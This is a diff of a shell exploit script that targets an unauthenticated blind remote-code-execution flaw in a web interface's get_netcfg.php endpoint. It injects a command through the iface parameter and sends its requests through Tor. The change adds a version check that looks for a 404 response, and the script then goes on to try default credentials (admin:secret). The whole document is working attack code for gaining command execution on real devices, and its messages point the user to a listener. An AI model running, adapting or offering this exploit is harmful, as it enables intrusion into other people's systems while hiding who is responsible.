@@ -9,11 +9,21 @@ echo ""
 echo "Unauthenticated Blind RCE (you need a listener or webhook / you also need to encode space -> %20)"
 
 
-torify curl -s "$1/ajax/networking/get_netcfg.php?iface=\$($2)" >/dev/null
+rce=$(torify curl -s "$1/ajax/networking/get_netcfg.php?iface=\$($2)" | grep 404)
+
+if [[ $rce == "" ]] ; then
 
 echo "" 
-
 echo "Well Terrorists win anyway i guess.. check your listener"
+
+else
+
+echo "" 
+echo "Verison too old"
+
+fi
+
+
 
 echo ""
 echo "Trying to RCE with default creds admin:secret"
